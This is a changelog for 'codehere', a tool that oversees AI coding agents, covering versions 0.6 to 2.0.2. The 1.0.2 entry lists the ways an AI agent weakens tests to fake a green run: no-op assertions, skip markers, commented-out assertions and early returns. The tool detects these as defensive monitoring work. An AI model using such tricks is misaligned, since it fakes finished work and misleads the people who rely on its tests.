# Changelog

> From 2.0.0 the package is the team brain in `v2/` ([v2/README.md](v2/README.md)). 1.0.2 and 1.0.3 are `codehere check` only, still on npm as `codehere@1`. Entries before 1.0.2 describe the earlier product (orchestrator, dashboard, cost and audit features). That code is no longer in this package.


All notable changes to codehere are documented in this file.

The format is based on [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning 2.0.0](https://semver.org/spec/v2.0.0.html).

---

## [2.0.2] - unreleased (prepared 2026-10-30)

- A team lesson for a failed `assert.equal` reaches only a failing test with the same name. In 2.0.1, lessons matched on the first error line alone, which every failed `assert.equal` in `node --test` shares, so one lesson reached nearly every failing test. Lessons and help cards now record the failing test's name; lessons without one match as before.
- "tambahin" and "buatin" count as a request to build something, so the agent asks "How will you know it works?" first, as it already did for "tambahkan" and "bikinin".

## [2.0.1] - 2026-10-29

- `codehere --version` and `codehere -v` print the version. In 2.0.0, `--version` printed the help text and `-v` was an unknown command.
- The npm page's homepage link points at `main`. In 2.0.0 it pointed at the `v2-team-brain` branch, which goes away after the merge.

## [2.0.0] - 2026-10-29

A different tool under the same name: a team brain for Claude Code, Codex CLI and GitHub Copilot CLI, built in `v2/` and released as betas on `next` from 26 Oct (2.0.0-beta.1 to 2.0.0-beta.3).

- Team rules load at session start. A teammate's lesson reaches the agent the first time a matching error appears.
- After the same error 3 times, the agent is told to stop and find the root cause.
- At "done", Codehere re-runs your tests and sends the agent back when they fail, at most 3 times. It runs the test command only after `codehere approve` on your machine.
- `codehere init --agent claude,codex,copilot`, `codehere uninstall`, and rules, lessons, help cards and briefs shared through git.
- Evidence for each build is in `v2/docs/evidence/`, and the runs on each real agent in `v2/docs/conformance/`.

`codehere check` is not in 2.0: run `npx codehere@1 check`. The GitHub Action pins its own 1.x version.

## [1.0.3] - unreleased (prepared 2026-10-17)

The package changes are README-only. No change to the `check` command or the Action.

### Changed

- The README no longer says that 1.0.2 and its `--base` and `--claim` options are unpublished, or that the Action's default version is not on npm.
- Publishing moves to GitHub Actions with npm trusted publishing and provenance, instead of a stored npm token.

---

## [1.0.2] - 2026-10-17

`codehere check` now catches the ways an AI makes a green test run mean nothing,
and produces a receipt that can be reproduced.

### Fixed

- Spend estimates for Anthropic models price cache writes at 1.25x input instead of 1.0x. Checked against a recorded Claude Code run: the estimate now equals that run's `total_cost_usd` exactly (it was 14% low).
- The MCP `codehere_trust` tool no longer says "Safe" for a file with a critical finding. It says "Block".
- `check` no longer says "Tests pass" when Node's test runner ran 0 tests (for example a file named `calc.tests.js`, which `node --test` skips and still exits 0). It now says "No tests ran" and exits 1.

### Added

- `check` flags tests weakened in the change, in test files that already existed:
  an assertion swapped for one that checks nothing (`assert True`,
  `assert.ok(true)`, `expect(true).toBe(true)`), a skip marker or `{ skip: true }`,
  an assertion commented out, and an unconditional `return` above an assertion.
  It exits 1 even when the suite passes. A conditional return is left alone.
- `check --claim "<the AI's summary>"` lists test files the AI named that exist
  nowhere in the checkout (a file counts as present if any file has that name).
- `check --base <ref>` reads everything since the branch left `<ref>`, committed or
  not, which is what a pull request looks like. An unknown ref, or one starting
  with `-`, is refused.
- `check --json` adds `weakened`, `missingClaimed`, a one-word `verdict`
  (`pass`, `fail`, `unverified`, `skipped`) and the `receipt` text.
- `eval/false-done.mjs`: measures `check` against 12 reconstructed false
  "tests pass" cases and 8 honest controls. Result on 2026-10-05: 10 of 12
  caught, 0 false alarms.
- `action/`: a GitHub Action that re-runs a pull request's tests on the repo's own
  runner and keeps one receipt comment. Lives in the repository, not in the npm
  package. Dry-run locally and tested against a mock of the GitHub API; not yet
  run on a real pull request.

### Changed

- The receipt's "Reproduce independently" line now repeats `--base` and a short
  `--claim`, so running it gives the verdict the receipt shows. Before, the plain
  command exited 0 on a result the receipt marked as failed.
- With `--base`, the text output points at `git diff <ref>...HEAD`.
- `check` on a folder that does not exist is now an error (exit 1). Before, it said "no test suite" and exited 0.

### Known limits

- Two kinds of false "done" are not caught because they are outside the tests: a
  passing suite with a broken build, and code the tests do not cover.
- The weakening checks read specific patterns. Other ways to weaken a test pass.
- Without `--base`, only uncommitted changes are read. `--base` needs the base ref
  to exist in the clone (a shallow CI checkout must fetch it).
- A Python repo without pytest installed is reported as not verified.

## [1.0.1] - 2026-08-10

Same release as 1.0.0 below — the version number moved, nothing else did.

npm permanently reserves a version slot once it has been published and
unpublished, and `1.0.0` was burned that way months ago. The pre-publish
tombstone check caught it (E400) before anything shipped, so 1.0.1 is the first
number this release could actually use. The list of burned slots on this
package: 0.1.0, 0.1.2, 0.2.0, 0.3.0, 0.4.0, 0.5.0-alpha, 0.5.0-alpha.0,
0.5.1-alpha, 0.5.2-alpha, 0.5.3-alpha, 1.0.0.

Everything under 1.0.0 below is what you get.

## [1.0.0] - 2026-08-08 — never published (slot tombstoned on npm)

589 commits since 0.8.0. The short version: codehere stopped taking its own word
for things.

0.8.0 could tell you what your agents did. It could not always tell you whether
what it told you was true. Most of this release is closing that gap, and a fair
amount of it is codehere catching itself.

### The honesty fixes (read these first)

These were all found by driving the product, not by reading the code.

- **A scan reported a scanner it never ran.** `codehere scan` decided which
  scanners had run by checking whether they were *installed*. semgrep's default
  ruleset is a registry fetch that can take over three minutes; when it timed out
  it returned zero findings, and the CLI printed "codehere ran gitleaks + semgrep
  on this app and nothing critical surfaced. Observed, not assumed." Now `ran`
  means ran, a scanner that dies is named out loud, and the all-clear is withheld
  when coverage had a hole.
- **A fix could be "proven closed" by a broken scanner.** The fix loop re-scanned
  and called a danger closed whenever it was absent. If the scanner that found it
  died on the re-scan, the danger was absent for the wrong reason. A finding can
  now only be closed by a scanner that actually ran.
- **An empty audit chain verified.** A hash-chain walk over zero entries
  trivially succeeds, so `codehere audit verify --json` returned `valid: true`
  and exit 0 on a machine with no audit log at all — while the human-readable
  output on the same command correctly said "No audit entries yet". Deleting the
  audit log is the attack a hash chain exists to detect. Nothing to verify is now
  its own state, on the CLI, the API and the dashboard.
- **Re-running a suite the agent just rewrote is not verification.** Verdicts now
  derive their evidence tier from what codehere itself observed, and an opinion
  cannot render as proof — green is reserved for something re-executed.
- **The detection claim is measured, not asserted.** Detection quality runs as a
  CI ratchet with a real false-positive count instead of a promise.

### Security

- **Dependency confusion, twice.** codehere shelled out to `npx <tool>`, which
  falls back to the public registry when the tool is not installed locally —
  including on the verification path. Both call sites now pass `--no-install`,
  pinned by a source-level test.
- Team records are signed with a TOFU trust anchor, and `--strict` fails on a
  tampered or broken record.

### New

- **`codehere team`** — a local-first shared ledger: what each agent did and what
  it cost, per project, self-syncing over your own git remote. Signed shares,
  cost and audit merged into one view, and a `codehere_team` MCP tool so an agent
  session can query it directly.
- **Per-model cost.** Opus, Sonnet and Haiku are priced separately rather than as
  one flat tier, for Gemini and Aider as well as Claude and Codex.
- **Budgets you can set from where you see the spend** — inline on the Spend &
  Audit page, presets or a number you type.
- **GitHub issue loop.** Connect once via device flow, pick an issue into the
  composer, get results commented back.
- **`codehere search`** — session search that shows its work.
- **MCP over Streamable HTTP**, with a per-client connect helper.
- **Deep links.** `/#/task/:id` is unique and bookmarkable; rooms and Spend live
  in the address bar too.

### Changed

- The dashboard was redesigned around one navigator and one you-are-here, with a
  Day Log that reads one line per task and can tell a failover from a hand-off.
- Colour is governed by machine gate, not by convention: the largest type on any
  surface is a measured fact, and green belongs to re-executed evidence only.
- Crash handling exits instead of continuing in an unknown state.
- Whole-file state writes are atomic.

### Removed from the default install

- **`codehere` no longer installs `@mohammednagy/graphify-ts` for you.** It powered
  optional context packs, and it accounted for every one of the 6 high-severity
  advisories in the production dependency tree plus roughly 125 MB — via
  `@huggingface/transformers` pulling `sharp`, `onnxruntime-node` and
  `onnxruntime-web`. npm also now reports it deprecated and renamed. A default
  install went from **514 MB to 152 MB**, and `npm audit --omit=dev` from **6 high
  to 0**.

  It is an optional peer dependency, so nothing changes for you unless you want
  context packs — install it yourself and `CODEHERE_GRAPHIFY=force` works as
  before. Without it, prompts are passed through untouched rather than partially
  enriched, which is pinned by test.

## [0.9.0] - 2026-06-07

The legitimacy release: every claim re-proven against the running product
(v0→v1 readiness audit, 7 lanes + real-vendor walks), the gaps fixed, and
the v1.0-tier features shipped.

### Added

- **@all fanout (read-only).** Type `@all <question>` in a room — the same
  question goes to every READY agent at once, answers render side-by-side,
  one real column per vendor (never a fake one).
- **Multi-task rollup.** Tasks spawned together share a batch; the room
  shows one parent row ("3 sub-tasks · 1 done · 1 running · 1 failed"),
  derived live, surviving daemon restarts.
- **draw.io + Figma overlays.** `drawio://` and `figma://` chips open
  provider-shaped preview cards (draw.io verified against a live public
  diagram; Figma renders from your connected account).
- Shell completions now reflect the real command set (the old ones
  completed commands that never existed).

### Fixed

- A goal pointed at a nonexistent folder is refused with a clear message
  instead of hanging "running" forever.
- A vendor that isn't usable (unbilled key, missing auth) is refused at
  task creation with the exact fix hint, instead of failing generically.
- `kill` exits nonzero on failure and explains in plain English.
- The home leads with YOUR goals; demos and observed sessions render below.
- Test daemons never open browser tabs or squat fixed ports.
- The verify harness can no longer be fooled by hidden elements, and the
  task audit-line shows only claims derived from real state.

## [0.8.0] - 2026-06-07

Your AI work gets a home: the goal room. The v1-spec build, stranger-verified —
ships as 0.8.0 because 1.0.0 is earned by real users, not declared by code.

### Added — the goal room (the v1-mvp-spec build)

- **Goal-first home.** The dashboard is a list of your goals; each goal is a
  room. Every task with the goal's folder lands as a turn in that room, in
  order, with time-gap markers ("3D LATER") between work sessions. Demos and
  observed-terminal sessions render below your goals, never above them.
- **Multi-agent turns in one shared room.** Hand the same goal between Claude
  Code, Codex, Aider, OpenCode, and Gemini — the room's composer pins the next
  task to the goal's folder and defaults to whichever agent worked it last.
- **The agent remembers the project.** On every spawn in an initialized
  project (`codehere init`, or an existing AGENTS.md), the agent is briefed
  with the project memory — including what the previous run did
  (write-back per turn), so agent #2 picks up where agent #1 left off.
- **Every vendor's words reach the thread.** Codex, Gemini, and OpenCode
  narration now lands in the room and upgrades their Final Reports — closing
  the say-gap that made non-Claude agents look mute.
- **Project-memory nudge.** A room whose project has memory off shows one
  honest line and a one-click "turn on project memory" that runs the same
  hardened scaffold as the CLI.

### Fixed

- `CODEHERE_HOME` now isolates ALL state — previously 17 paths (audit,
  spend, threads, agents.yaml…) still read/wrote the real `~/.codehere`.
- `codehere start --no-open` is honored when a daemon is already running
  (the second invocation no longer pops a browser).
- Daemon e2e tests bind OS-assigned ports — fixed test ports no longer
  collide with a running daemon or flash on the machine.

## [0.7.1] - 2026-06-04

Mock-fidelity patch: the mock layer now reproduces the product faithfully.

### Fixed

- Mock mode could leak real spend through the `appendMessage` path — now
  routed through the mock seam with a contract guard.
- Mock runs short-circuited the Final-Report engine — they now run the SAME
  report pipeline as real runs (reproducing per-vendor report differences
  faithfully).
- Mock edits touched real source files — they now write only the gitignored
  `codehere-mock-change.md`.

---

## [0.7.0] - 2026-06-02

The honest, watchable release: every surface verified, and you can drive it yourself.

### Added — verify-at-the-surface + remote control (2026-06-02)

- **Watchable verification across every surface.** One command —
  `node agent/scripts/verify-all.mjs` — checks web · API · CLI · subsystems ·
  remote-control · adapters and prints PASS / FAIL, mocks only, no spend. A
  `/verify` dashboard (open it, click Run all) with a designed-to-fail probe
  proves the harness can actually catch a lie. Building it caught and fixed
  three real bugs: codex file edits were dropped from the timeline you watch,
  a session-list cap silently hid seeded sessions, and a CLI subcommand the
  docs claimed (`thread rename`) didn't exist.
- **Remote control — steer a live agent from the web, honestly.** From a
  terminal session codehere observes, continue the work in a managed agent and
  steer it (continue · run tests · show diff · stop), reachable from any
  signed-in device, with every steer recorded in the audit chain. The
  "Remote Control · live" badge and the steer box appear **only when a real
  channel is attached** — never a dead button.

### Added — v0.7 scope (honest baseline · per tier scope)

- **Verifier-agent · real claim-vs-execution diff.**
  `codehere verify <task-id>` CLI + `.verifier-killer-step` web UI
  surface in task detail. Final-Report claims diffed against
  audit-chain reality. Centered `.verified-block` celebration card on
  clean verdict (38px ✓ badge · uppercase VERIFIED kicker · computed
  stats line). Per `claim_market_position` v4 — the unique
  differentiator in the demo.
- **`codehere audit verify` + `audit show` CLI** — walk the SHA-256
  hash chain, report intact / tampered, machine-readable verdict for
  CI. Closes the "audit chain visible without trusting the daemon"
  claim.
- **Inline audit-line entries between tool cards in web UI** — `#0001
  pre-prompt scan clean · routed to <agent> · context: <N> files · L0
  hooks loaded` at the start of every detail timeline. Plus
  per-verifier `#NNNN verifier-agent verdict captured · chain entry
  final · sha256:<prefix> · entry hashed + signed locally · no upload`.
  Chain is visible in the flow, not just summarized in the footer.
- **Local-first / zero-telemetry pill** in dashboard header (`local ·
  127.0.0.1:NNNN` green-dot pill).
- **OSS / MIT footer** with brand-tinted `codehere` wordmark + version
  + GitHub + license + `built locally · zero telemetry · audit chain
  v3` proof strip.
- **Cross-worktree alert UI** element wired (renders when a session's
  lifetime exceeds 5x adapter timeout).
- **5 adapter contract documents** at
  `docs/contracts/{claude-code,codex,aider,gemini,opencode}.md` +
  surface contracts (`cli-commands.md` · `http-api.md` ·
  `00-FINDINGS.md` divergence-list).

### Added — v0.8 scope (cross-tool context)

- **Context-source primitive** at `~/.codehere/context-sources/` ·
  adapter contract `fetch(url) → ContextPayload` · URL scheme routing
  (`linear://` · `figma://` · `drawio://` · `github://`) in the agent's
  read tool.
- **`codehere context-source` CLI** — `list` · `connect <id>` · `status`.
- **Linear + Figma + drawio + github-issues reference adapters** ·
  shipped per `feat(v0.8): S5 · drawio + github-issues adapters` and
  prior commits.
- **Reshape view (basic)** · web UI modal with brand-gradient-border
  card + 3 quick-start preset pills + persona dropdown + agent-compose
  preview animation + `primitives-note` blue block listing the 8
  composable primitives (`turn` · `panel` · `artifact` · `audit-line`
  · `tool-card` · `verified-block` · `file-chip` · `write-pass`).
- **4 persona presets** (Eng Manager · Solo founder · Auditor · PM /
  Designer) · hide/show CSS variants applied to root.
- **Share-thread signed-payload export** · `codehere thread export
  <id>` produces signed JSON · `codehere thread import <file>` verifies
  + replays into local view. Share-modal in web UI with brand-tinted
  `codehere://thread/<sid>?signed=ed25519:<fp>` link + orange-filled
  Copy link + Download bundle (.json) + signed-payload-not-source-code
  footer note. This is "GitHub for agent sessions" v1 (signed-payload
  federation).
- **Click-to-preview `ctx-url-chip`s** wrapping `linear:// github://
  figma:// drawio://` URLs that appear in tool-card output · clicking
  opens the overlay-renderer with adapter status (honest auth-not-
  configured surfacing when adapter isn't wired).

### Added — v0.9 scope (trust-layer arc)

- **W-PASS write-pass primitive** — adapter contract extended with
  `propose(url, payload) → request`. Inline `.write-pass` blue-
  accented card in step timeline (when a step's label matches W-PASS /
  write-pass) with diff-colored payload preview (`in-progress` red
  strike-through · `done` green · `→` dim arrow) + Approve + send /
  Edit payload / Cancel action row.
- **W-PASS approval modal** at `/api/writepass/pending` poll · full
  modal with brand-orange "● WRITE-PASS · AGENT ACTION · AWAITS YOUR
  APPROVAL" banner + reason + tool/agent/domain meta rows + JSON
  payload preview + 3-button action row + mediation footer.
- **Mediated-write per-domain trust grades** (A / B / C / D / F) ·
  pill with grade colour · pulled from `/api/writepass/<id>/trust` per
  pass.
- **Overlay-renderer (Linear reference)** · centered overlay with
  brand-blue gradient-border `.or-card` · adapter status header +
  body + "Ask agent" composer + audit-chain capture badge. Linear
  ref impl shipped; Figma + drawio overlay-renderers deferred to v1.0.
- **Federation v1** (signed-payload export/import only · async like
  Git format-patch) · 2-machine flow target. Cloud-relay is NEVER
  per `feedback_context_source_and_federation_2026-05-22.md`.

### Added — agentic UX framework (LOCKED 2026-05-06 · most patterns shipped)

- Per [`docs/design/AGENTIC_UX.md`](./docs/design/AGENTIC_UX.md) — 22
  patterns specced · 11 macro-states · 4 activity layers · 13 prior
  questions Q1-Q13 resolved · 3 strategic questions locked. Track A
  rollout ~21 commits / ~1900 lines · Track B rollout ~13 commits.
- **Color palette LOCKED + CVD-tested** — brand peach `#ff9a76` (logo
  only) + 5 codehere-native agent slots (deep-coral · amber · slate-
  blue · plum · olive) all passing deuteranopia + protanopia gates
  (closest pair distance >45).
- **Ambient dot-grid backdrop + glass-card hover-lift** task cards
  (`translateY(-2px)` + 12px 40px shadow + inner-ring on hover).
- **20 visible demo-v12 fidelity gaps** (commits `f2118b6` →
  `e90823e`) · side-by-side at `:3899` vs
  `agent/test/evidence/planning/codehere-demo-v2.html` · each gap has
  before/after screenshot under
  `agent/test/evidence/screenshots/2026-05-24/`.
- **OpenCode buffered-output reveal (Pattern 21)** — deferred · last
  AGENTIC_UX Track A pattern remaining · 2-4 hr estimate · task #107.

### Changed — positioning + honest copy

- **Sharpened moat statement** per
  [`docs/audit/PHASE4_PROPOSAL.md`](./docs/audit/PHASE4_PROPOSAL.md)
  §H: cross-vendor failover with context handoff + F3 memory + hash-
  chain audit on a single `npm install` at the individual tier. Drops
  the "multi-agent parallel spawn" lead (now native in Codex / Gemini
  / Composio / Conductor) — codehere's batch is one shape of many ·
  only the CROSS-VENDOR batch is unique.
- **Hook framing in PRD §4.2** — was "PreToolUse hook (Claude full,
  others v0.6)" misleading. Now per-adapter detail: Claude Code full
  per-tool synchronous · Codex/Aider/Gemini/OpenCode cross-vendor
  pre-prompt scan (whole-prompt critical/high) + post-hoc mirror
  visibility-only · per-tool synchronous on other 4 is structurally
  hard and remains future work.
- **PRD §6.4 ARCHIVED banner** — the v0.5/v0.6/v0.7/v0.8 forward-plan
  rows in PRD §6.4 are now flagged ARCHIVED with explicit pointers at
  V1_STATUS.md · PHASE4_PROPOSAL.md · project_v1_tiered_scope_2026-05-22
  · GTM_EXPLORATION_OPENCODE.md · AGENTIC_UX.md.
- **PRD Lean Canvas §13** — solution row updated from "50-pattern
  trust scanner, 33 CLI commands" to "Trust scanner (34 code patterns
  + 51 instruction patterns, verifiable via `npm run pattern-counts`)
  · 17 visible CLI commands + 4 hidden."

### Added — process + living docs

- [`docs/V1_STATUS.md`](./docs/V1_STATUS.md) — single living source of
  truth: per-tier feature matrix · demo-v12 visual fidelity matrix ·
  agentic-UX framework status · multi-user/federation status ·
  state-dependent UI verification table · operating discipline
  reference · 4-track post-execution evaluation protocol · references.
  Wired into `agent/CLAUDE.md` session-start ritual.
- [`docs/retros/2026-05-24-demo-fidelity.md`](./docs/retros/2026-05-24-demo-fidelity.md)
  — 173-line session-arc retro on the 20-gap demo-fidelity arc · 4
  tracks at full fidelity · banked 4 new memory rules.
- [`agent/test/evidence/planning/2026-05-24-keep-improve-remove.html`](./agent/test/evidence/planning/2026-05-24-keep-improve-remove.html)
  — Thariq-style interactive HTML triage of 51 rows × 10 sections ·
  KEEP/IMPROVE/REMOVE/DEFER per row · live counter + filter + export
  to MD checklist.

### Fixed

- **Share modal `var(--brand)` undefined** — `.share-link-box` color +
  `.share-btn-primary` background were referencing `var(--brand)` which
  doesn't exist in product (canonical is `--accent`). Copy link button
  was rendering colorless. Signed-payload link was rendering near-white.
  Both now brand-orange per spec.
- **Time-gap subtitle adjective → measurement** (R10 numbers-over-
  adjectives rule). Was "BETWEEN SESSIONS" / "SINCE YOU STEPPED AWAY"
  · now relative time string ("≈ 5 hours" · "≈ 2 days" · "≈ 1 week").
- **openWpModal `setTimeout(300)` race** — `wpRender` now returns the
  trust-fetch promise · openWpModal chains `.then()` instead of
  guessing a delay.
- **W-PASS demo trust row honest-about-being-demo** — trust-reason
  now reads "...· (demo data · linear adapter not configured)" when
  synthesized · per `no-screen-lies` + `demo-synth-modal-pattern`
  rules.

### Internal

- **Branch state:** `dev/v0.3.0` is 87 commits ahead of `main` (where
  v0.6.2 lives). Working-tree clean as of CHANGELOG draft.
- **Helper consolidation:** 15 ad-hoc `agent/scripts/shoot-*.mjs`
  scripts collapsed into a single parameterized
  `agent/scripts/shoot.mjs`. Net -262 lines.
- **Memory entries banked** (in the maintainer's local notes):
  `feedback_side_by_side_dogfood.md` ·
  `feedback_demo_synth_pattern.md` ·
  `feedback_tag_what_shipped.md` ·
  `feedback_demo_spec_polish_authorized.md` (amendment to
  `feedback_agentic_ux_specificity.md`).
- Per `feedback_tag_what_shipped.md` STANDING rule: if these features
  ship, the tag should match. Decision on whether to tag v0.7.0 / v0.8.0
  / v0.9.0-alpha is a one-way owner decision — see V1_STATUS.md §0.

### Operating rules in force

- [`docs/OPERATING_RULES.md`](./docs/OPERATING_RULES.md) — STANDING.
  5 product-discipline rules (R1-R5) + 6 token-efficiency rules (T1-T7,
  including caveman mode, tool-order pyramid, subagent policy) + 4
  UI-honesty rules (R8-R11 surface-honesty added 2026-05-19). Loaded
  into agent/CLAUDE.md session start.
- 4-track post-execution evaluation (per
  `feedback_post_execution_evaluation.md`) is the from-now-on protocol.
- HTML-not-MD for planning artifacts (per
  `feedback_html_not_md_for_plans.md` · Thariq Shihipar's Code w/ Claude
  London 2026-05 method).

---

## [0.6.2] — 2026-05-19

_First-impression bug bundle caught by UAT Run #1 (docs/UAT_v0.6.1.md).
All three fixes are about what a new user sees in the first 30 seconds
of REPL use. Ships as the "now safe to send to friends" cut._

### Fixed

- **UAT-001 — REPL slash menu lies (CRITICAL).** `SLASH_COMMANDS` in
  `src/ui.ts` was carrying 16 ghost commands removed in v0.3
  (`/ask`, `/explain`, `/fix`, `/review`, `/plan`, `/suggest`, `/test`,
  `/docs`, `/refactor`, `/orchestrate`, `/run`, `/git-review`, `/index`,
  `/cost`, `/models`, `/undo`) AND was missing 8 real commands
  (`init`, `memory`, `permission`, `narrator`, `budget`, `start`,
  `task`, `kill`). Replaced with the synced list. Typing `/` in the
  REPL now shows exactly what works.
- **UAT-002 — Bare `exit` in REPL gets routed as a Conductor prompt
  (HIGH).** Pre-fix: typing `exit` (no slash) booted Conductor, picked
  claude-code under default routing, burned a real API call, failed
  network. Now: REPL recognizes `exit`/`quit`/`q`/`bye`/`goodbye`/
  `logout`/`:q` as exit-intent and leaves the session before any spawn.
- **UAT-003 — Final Report echoed provider error verbatim (MEDIUM).**
  When a task ends in error, `generateFinalReport` now short-circuits
  the LLM call and returns a deterministic plain-English recovery hint
  (saves tokens + gives an honest next step). When a task completes
  but the generated summary matches network-failure patterns
  (`ECONNREFUSED`, `ENOTFOUND`, `Request ID: req_...`, etc.), the
  summary is wrapped with a recovery preamble instead of leaking the
  raw provider error.

### Added

- **CI guard against future slash-menu drift.**
  `test/cli/slash-commands-sync.test.ts` (4 tests) asserts both
  directions: every non-`replOnly` SLASH_COMMANDS entry has a matching
  `program.command()` in `src/index.ts`, AND every visible Commander
  registration has a SLASH_COMMANDS entry. Drift fails CI — the same
  16/8 split that shipped through three minor versions can't recur.
- `SlashCommand.replOnly?: boolean` flag for REPL-only meta-commands
  (`agents`, `history`, `clear`, `exit`) that are handled inside the
  REPL loop, not registered as Commander commands.

### Internal

- Test count: 1196 → 1200 (+4 for the new CI guard).
- v0.6.2 ships alongside an updated `docs/UAT_v0.6.1.md` run log —
  UAT-001/002/003 marked closed; UAT-004 (Conductor noise reject) +
  UAT-005 (welcome file count) remain on the v0.7 track.

---

## [0.6.1] — 2026-05-19

_Post-v0.6.0 hardening + audit pass. Closes credibility-leak doc drift,
adds runtime source-of-truth for pattern counts (drift caught itself
in the first run), wires the last cross-vendor audit-mirror gap
(OpenCode → #114), and adds daemon crash-safety so unhandled
rejections + uncaught exceptions can't silently kill the daemon._

### Added

- **OpenCode tool-call audit mirror** (closes #114). OpenCode's `tool_use`
  events now mirror into `~/.codehere/audit/hook-events.jsonl` with
  Claude-cased tool names (Bash/Read/Write/Edit/Grep/Glob/...) so the
  `/history` filter chips group cross-vendor. Post-hoc visibility only;
  no synchronous block until upstream pre-tool hooks land.
- **`npm run pattern-counts`** — single source of truth for the two pattern
  banks. Prints `CODE_PATTERNS.length` (trust-scorer) + `PATTERNS.length`
  (claude-sdk-hook) with severity breakdowns. Caught a real drift on the
  first run (we said 50 instruction patterns, actual is 51).
- **Global crash safety in the daemon entry point**: `unhandledRejection`
  + `uncaughtException` handlers log stack traces instead of silent exit.
- **Graceful SIGTERM shutdown** for `codehere start` and `codehere serve` —
  calls `SessionManager.shutdown()` + `stopCloudSync()` defensively
  before closing the HTTP server.

### Changed

- Exported `PATTERNS` from `claude-sdk-hook.ts` so the pattern-counts
  script + future doc tooling can quote a live number instead of
  hardcoding one.
- **Doc drift bulk fix** (PRD, ARCHITECTURE, agent/CLAUDE.md): version
  references aligned to v0.6.0 stable, file count corrected
  (82 → 69), trust-scorer pattern count corrected (50 / 60+ / 36 → 34
  code patterns + 51 instruction patterns split honestly), CLI command
  count corrected (13/14 → 17 visible + 4 hidden), and PRD §4.2
  hook-coverage framing rewritten to match the honest README
  framing (Claude synchronous PreToolUse via Agent SDK; other 4
  adapters: pre-prompt scan blocking + post-hoc mirror visibility;
  no synchronous block on the 4).

### Security

- **`/api/permissions` POST body reader hardening**: refactored to use
  the existing `readBody()` helper which enforces a 2 MiB body cap.
  Previously the inline reader accepted unbounded body length.
- **Timing-safe Bearer-token comparison** for `serve --token`. Replaced
  string equality with `crypto.timingSafeEqual` over equal-length
  buffers to remove a side-channel.

### Internal

- v0.6.1 ships alongside `docs/audit/` — full 4-phase product audit
  (feature inventory + doc accuracy + market research + 90-day
  proposal) that informed all of the above.

---

## [0.6.0] — 2026-05-18

_The stable release. Promotes 0.6.0-alpha.1 to latest with all
uncommitted v2 work committed: failover pipeline (Slices A–F),
the v2 task-centric UI as default, cloud sync (opt-in --cloud),
cross-session context handoff, graphify structural memory, and
live daemon health indicator on the landing page. Track A wiring
complete (21/21)._

### Breaking changes

- **v2 UI is now the default** at `/`. The legacy v1 UI moves to
  `/v1`. The failover banner in v1 no longer appears by default.
- **codehere start --cloud** requires no other flags. Existing
  `--cloud` behaviour unchanged; just the enablement gate.

### Added

- **Failover pipeline** (Slices A–F) — error classifier,
  failover-config, context-handoff, graphify-context, session
  threading (`continuedFrom`/`continuedAs`), failover UI (SSE
  in v2), thread mirror. `handleFailover()`, `acceptFailover()`,
  `getFailoverOffers()` in session-manager.
- **v2 task-centric UI** — served at `/`. Squad bar, filter tabs
  (All/Running/Done/Failed), task detail with conversation turns
  + tool trace, budget display, offline detection, skeleton
  loading, cmd+k keyboard shortcut, SSE real-time updates.
- **Cloud sync** — 243-line privacy-respecting bridge, gated
  behind `--cloud`. Only metadata leaves the machine.
- **Context handoff** — `loadHandoffContext()` and
  `enrichPromptWithHandoff()` for cross-session context packs.
- **Graphify context** — wraps `@mohammednagy/graphify-ts` for
  structural memory injection at task spawn.
- **Live daemon health** on codehere.uk — `/health` polled every
  10s, green/red/yellow status dot, live version string.
- **PreToolUse hook enhancements** — hash-chain audit trail for
  every action, 47 instruction patterns.

### Changed

- **agent/src/** grew from 54→82 source `.ts` files.
- **codehere start --cloud** flag added.
- **Trust scorer** — 2-pass, 32 CWE patterns (was 1-pass, 36).
- **Session Manager** major refactor (+448 lines includes
  failover, threading, graphify enrichment).

### Fixed

- **Docs drift** — ARCHITECTURE.md (8 inaccuracies: stale layer 1
  commands, file count, memory injection, hash chain, config path,
  trust scorer pass count, module map, ambition bridge). PRD.md
  (ghost file removed, file counts updated). CLAUDE.md (ghost file
  reference removed).
- **Landing page stale claims** — 5 fixes across 4 files (command
  count, routing flow, attack patterns, hook description, supported
  providers).

---

## [0.6.0-alpha.1] — 2026-05-09

_The cost-bounded execution release. Closes
`claim_market_position` v3's "cost-bounded execution"
capture-strategy edge end-to-end + makes the M3 narrator user-tunable +
adds plain-English "when to use me" hover hints to the agent dropdown.
Rolls in everything from the unpublished alpha.0 candidate (all 9 v0.6
MUST items + Track A 19/22 patterns + permission gate + audit-log
integrity hardening, see below)._

### S3 — cost-bounded execution (the new v1 promise)

- **Spend-today aggregator** (S3 slice 1) — reads `~/.codehere/sessions.jsonl`, sums today's `artifacts.usage` tokens × per-tier ceiling. Free-tier specialists (gemini, opencode) report $0 explicitly. `GET /api/spend/today` returns `{ totalUsd, tokens, sessionCount, byAgent, windowStartedAt, budget }`. Conservative-high pricing (Sonnet $15/MTok output, codex $10/MTok, input ≈ 1/5 output) so the chip never under-warns. Per `feedback_overconfidence_guard.md`, framed as "estimate" with vendor-dashboards-are-authoritative tooltip.
- **Per-day budget config + pre-spawn enforcement** (S3 slice 2) — `~/.codehere/budget.yaml` (`daily_usd`, `warn_at_pct`), hand-editable with auto-comments. New `codehere budget [show | set <usd> | off]` CLI. `POST /api/task` and `POST /api/task/batch` return `HTTP 429 daily_budget_exhausted` with a plain-English message ("switch to gemini/opencode or raise it") when today's spend ≥ ceiling. Free-tier specialists ALWAYS pass — matches user intent "don't let me spend more, but free is fine". Conductor counts as paid (routes to Claude Code). Dashboard `.cm-spend` chip displays `$X.XX / $Y` with ok / warn / block color states; tooltip shows per-agent breakdown + over-budget recovery hint.

### S5 — adapter description tooltips

- Each adapter (claude-code, codex, aider, gemini, opencode) ships an `AgentAdapter.description` field — a one-line plain-English "when to use me" hint surfaced as the `<option title>` hover on the dashboard agent dropdown. Wired through `availableAgents()` + `readinessForAllAgents()` + `/api/readiness/agents`. Per `claim_user_persona` HIGH a non-technical user picking an agent now sees what each one is good for instead of just a label.

### S6 — editable PM brain prompt

- M3 narrator's prompt template lifted from a hard-coded string into `~/.codehere/narrator-prompt.md` — plain Markdown with `{{prompt}} {{agent}} {{elapsed_seconds}} {{step_count}} {{steps}}` substitution. The user controls the agent's voice. New `codehere narrator [show | edit | reset]` CLI. Safety net: missing file → baked-in default; missing required placeholder → silent fallback to default (a typo never breaks narration). Per `claim_user_persona` HIGH the narrator IS the agent's voice for non-technical users.

### Rolled in from the unpublished alpha.0 candidate (v0.6 MUSTs)

_Per `docs/PLAN_v0.6.md`. All 9 MUSTs shipped at slice-1 level._

